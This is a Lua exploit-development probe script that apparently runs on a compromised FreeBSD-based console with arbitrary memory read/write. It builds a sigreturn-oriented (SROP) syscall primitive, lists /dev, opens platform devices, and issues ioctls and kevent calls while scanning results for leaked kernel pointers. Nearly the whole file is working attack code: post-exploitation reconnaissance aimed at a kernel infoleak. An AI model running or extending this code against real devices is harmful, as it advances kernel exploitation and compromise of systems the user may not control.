-- CRASH_CLASS: LOW
-- PROBE 142v: Enumerate /dev devices, try opens + ioctls
-- Fixed dirent parsing from 142s. Probes each device for kernel leaks.

print("=== PROBE 142v: DEV ENUM ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end
local function wb(addr, val)
    local cur = safe_rd(addr - (addr % 4))
    if not cur then return end
    local bytepos = addr % 4
    local mask = 0xFF * (2^(bytepos * 8))
    cur = cur - (cur % (2^((bytepos+1)*8))) % (2^(bytepos*8+8))
        + val * (2^(bytepos*8))
    wd(addr - (addr % 4), cur)
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)

local pid = to_num(sc20())
print("pid=" .. pid)

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x100000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))

local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + MC + 0xA0)
local brh, brl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", brh, brl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    return rv
end

--------------------------------------------------------------------
-- [A] Open /dev and parse dirents properly
-- FreeBSD dirent (variable-length):
--   +0x00: d_fileno (uint32_t = 4 bytes on FreeBSD 11)
--   +0x04: d_reclen (uint16_t)
--   +0x06: d_type   (uint8_t)
--   +0x07: d_namlen (uint8_t)
--   +0x08: d_name[] (variable, null-terminated)
--------------------------------------------------------------------
print("")
print("--- [A] /dev listing ---")

local devpath = gpu + 0x1000
wd(devpath, 0x7665642F)  -- "/dev" in LE
wd(devpath + 4, 0)

local rv_open = srop(5, ua(devpath), uint64(0x10000))  -- O_RDONLY|O_DIRECTORY
local oh, ol = get_hi_lo(rv_open)
if ol >= 256 or oh ~= 0 then
    -- Try plain O_RDONLY
    rv_open = srop(5, ua(devpath), uint64(0))
    oh, ol = get_hi_lo(rv_open)
end
print("[A] open(/dev) fd=" .. ol)

local devices = {}
if ol < 256 and oh == 0 then
    local dev_fd = ol
    local dent_buf = gpu + 0x2000
    local basep = gpu + 0x3000
    local total_bytes = 0

    -- Read up to 3 chunks
    for chunk = 1, 3 do
        for off = 0, 0xFFF, 4 do wd(dent_buf + off, 0) end
        wq(basep, uint64(0))

        local rv_gd = srop(196, uint64(dev_fd), ua(dent_buf), uint64(0x1000), ua(basep))
        local gdh, gdl = get_hi_lo(rv_gd)
        if gdl == 0 or gdh ~= 0 then break end

        local pos = 0
        while pos < gdl do
            local d_fileno = safe_rd(dent_buf + pos)
            if not d_fileno then break end

            local reclen_type = safe_rd(dent_buf + pos + 4)
            if not reclen_type then break end
            local d_reclen = reclen_type % 65536
            local d_type = math.floor(reclen_type / 65536) % 256
            local d_namlen = math.floor(reclen_type / 16777216) % 256

            if d_reclen == 0 or d_reclen > 512 then break end

            -- Read name byte by byte from +8
            local name = ""
            for ci = 0, math.min(d_namlen - 1, 63) do
                local word_off = pos + 8 + ci - (ci % 4)
                local w = safe_rd(dent_buf + word_off)
                if w then
                    local shift = (ci % 4) * 8
                    local ch = math.floor(w / (2^shift)) % 256
                    if ch >= 32 and ch < 127 then
                        name = name .. string.char(ch)
                    end
                end
            end

            if name ~= "." and name ~= ".." and #name > 0 then
                table.insert(devices, {name=name, dtype=d_type, ino=d_fileno})
                -- dtype: 2=chr, 4=dir, 6=blk, 8=reg
                local tstr = "?"
                if d_type == 2 then tstr = "chr"
                elseif d_type == 4 then tstr = "dir"
                elseif d_type == 6 then tstr = "blk"
                elseif d_type == 8 then tstr = "reg"
                elseif d_type == 10 then tstr = "lnk" end
                print("[A]  " .. tstr .. " " .. name)
            end

            pos = pos + d_reclen
        end

        total_bytes = total_bytes + gdl
    end
    print("[A] total bytes=" .. total_bytes .. " devices=" .. #devices)
    srop(6, uint64(dev_fd))
end

--------------------------------------------------------------------
-- [B] Try opening interesting devices
--------------------------------------------------------------------
print("")
print("--- [B] Device opens ---")

local interesting = {"null", "zero", "random", "urandom", "console",
    "dipsw", "notification0", "notification1", "rng",
    "icc_power", "icc_thermal", "dce", "hdmi",
    "camera", "pad0", "pad1", "gc", "paddr_allocator",
    "aout0", "aout1", "aout2", "ajm", "av_control"}

local opened_devs = {}
for _, dname in ipairs(interesting) do
    local path_buf = gpu + 0x4000
    -- Write "/dev/" prefix
    wd(path_buf, 0x7665642F)  -- "/dev"
    -- Write rest
    local rest = "/" .. dname
    for ci = 0, #rest - 1 do
        local ch = string.byte(rest, ci + 1)
        local off = 4 + ci
        local base = path_buf + off - (off % 4)
        local cur = safe_rd(base) or 0
        local shift = (off % 4) * 8
        cur = cur - (math.floor(cur / 2^shift) % 256) * 2^shift + ch * 2^shift
        wd(base, cur)
    end
    -- Null terminate
    local toff = 4 + #rest
    local tbase = path_buf + toff - (toff % 4)
    local tcur = safe_rd(tbase) or 0
    local tshift = (toff % 4) * 8
    tcur = tcur - (math.floor(tcur / 2^tshift) % 256) * 2^tshift
    wd(tbase, tcur)

    local rv = srop(5, ua(path_buf), uint64(2))  -- O_RDWR
    local rh, rl = get_hi_lo(rv)
    if rl < 256 and rh == 0 then
        print("[B] /dev/" .. dname .. " fd=" .. rl .. " OPEN!")
        table.insert(opened_devs, {name=dname, fd=rl})
    else
        -- Try O_RDONLY
        rv = srop(5, ua(path_buf), uint64(0))
        rh, rl = get_hi_lo(rv)
        if rl < 256 and rh == 0 then
            print("[B] /dev/" .. dname .. " fd=" .. rl .. " (RO)")
            table.insert(opened_devs, {name=dname, fd=rl})
        end
    end
end

--------------------------------------------------------------------
-- [C] Try ioctl on opened devices — look for kernel pointers
--------------------------------------------------------------------
print("")
print("--- [C] Device ioctls ---")

for _, dev in ipairs(opened_devs) do
    if dev.name ~= "null" and dev.name ~= "zero" then
        local out = gpu + 0x5000
        -- Try a few common ioctl codes
        -- FIONREAD = 0x4004667F (get bytes available)
        -- TIOCGETA = 0x40487413 (get terminal attrs)
        -- DIOCGMEDIASIZE = 0x40086418 (get disk size)

        local codes = {0x4004667F, 0x40487413, 0x40086418,
                       0x80044275, 0x80084276, 0xC0084277}

        for _, code in ipairs(codes) do
            for off = 0, 0xFF, 4 do wd(out + off, 0) end
            local rv_io = srop(54, uint64(dev.fd), uint64(code), ua(out))
            local ioh, iol = get_hi_lo(rv_io)
            if iol == 0 and ioh == 0 then
                print("[C] " .. dev.name .. " ioctl 0x" .. string.format("%08X", code) .. " OK!")
                -- Dump first 64 bytes
                for off = 0, 60, 4 do
                    local v = safe_rd(out + off)
                    if v and v ~= 0 then
                        print("[C]  +" .. string.format("%02X", off) .. "=0x" .. string.format("%08X", v))
                    end
                end
                -- Check for kernel pointers in output
                for off = 0, 56, 8 do
                    local q = safe_rq(out + off)
                    if q then
                        local qh, ql = get_hi_lo(q)
                        if qh >= 0xFFFF8000 then
                            print("[C] *** KERNEL PTR at +" .. string.format("%02X", off) .. "! ***")
                        end
                    end
                end
            end
        end
    end
end

--------------------------------------------------------------------
-- [D] Read from /dev/random and /dev/urandom
--------------------------------------------------------------------
print("")
print("--- [D] Random reads ---")

for _, dev in ipairs(opened_devs) do
    if dev.name == "random" or dev.name == "urandom" then
        local rbuf = gpu + 0x6000
        for off = 0, 0x1F, 4 do wd(rbuf + off, 0) end
        local rv = srop(3, uint64(dev.fd), ua(rbuf), uint64(32))
        local rh, rl = get_hi_lo(rv)
        print("[D] read " .. dev.name .. " ret=" .. rl)
        if rl > 0 then
            local s = ""
            for off = 0, math.min(rl - 1, 31), 4 do
                local v = safe_rd(rbuf + off) or 0
                s = s .. string.format("%08X ", v)
            end
            print("[D] data: " .. s)
        end
    end
end

--------------------------------------------------------------------
-- [E] Try kevent with make_syscall (different path than SROP)
--------------------------------------------------------------------
print("")
print("--- [E] kevent via make_syscall ---")

-- kqueue
local sc_kq = make_syscall(362)
local ok_kq, rv_kq = pcall(function() return sc_kq() end)
print("[E] kqueue=" .. hex(rv_kq))
local kqh, kql = get_hi_lo(rv_kq)

if kql < 256 and kqh == 0 then
    local kq_fd = kql

    -- Build kevent for EVFILT_READ on a socket
    local sp2 = gpu + 0x7000
    wd(sp2, 0xDEAD); wd(sp2 + 4, 0xDEAD)
    srop(135, uint64(1), uint64(1), uint64(0), ua(sp2))
    local s_a = safe_rd(sp2)
    local s_b = safe_rd(sp2 + 4)
    print("[E] sp=" .. (s_a or "?") .. "," .. (s_b or "?"))

    if s_a and s_a ~= 0xDEAD then
        -- Write data
        local wbuf = gpu + 0x7100
        wd(wbuf, 0x41424344)
        srop(4, uint64(s_a), ua(wbuf), uint64(4))

        -- Set up kevent struct for EVFILT_READ on s_b
        local kev = gpu + 0x8000
        wq(kev + 0x00, uint64(s_b))
        wd(kev + 0x04, s_b)  -- Actually this was already set by the qword write
        wd(kev + 0x08, 0x0001FFFF)  -- filter=-1, flags=EV_ADD
        wd(kev + 0x0C, 0)
        wq(kev + 0x10, uint64(0))
        wq(kev + 0x18, uint64(0xBEEF))

        local kev_r = gpu + 0x8100
        for off = 0, 0x1F, 4 do wd(kev_r + off, 0xEE) end

        local ts = gpu + 0x8200
        wq(ts, uint64(0))
        wq(ts + 8, uint64(0))

        -- Try kevent at 560
        local sc_ke560 = make_syscall(560)
        local ok560, rv560 = pcall(function()
            return sc_ke560(uint64(kq_fd), uint64(kev), uint64(1),
                           uint64(kev_r), uint64(1), uint64(ts))
        end)
        print("[E] kevent(560) ret=" .. hex(rv560))
        local r1 = safe_rq(kev_r)
        print("[E] result ident=" .. hex(r1))

        -- Try kevent at 363
        for off = 0, 0x1F, 4 do wd(kev_r + off, 0xEE) end
        local sc_ke363 = make_syscall(363)
        local ok363, rv363 = pcall(function()
            return sc_ke363(uint64(kq_fd), uint64(kev), uint64(1),
                           uint64(kev_r), uint64(1), uint64(ts))
        end)
        print("[E] kevent(363) ret=" .. hex(rv363))
        r1 = safe_rq(kev_r)
        print("[E] result363 ident=" .. hex(r1))
        local d363 = safe_rq(kev_r + 0x10)
        print("[E] result363 data=" .. hex(d363))
        if d363 then
            local dh, dl = get_hi_lo(d363)
            if dh >= 0xFFFF8000 then
                print("[E] *** KERNEL PTR! ***")
            end
        end
    end
end

print("")
print("=== DONE ===")
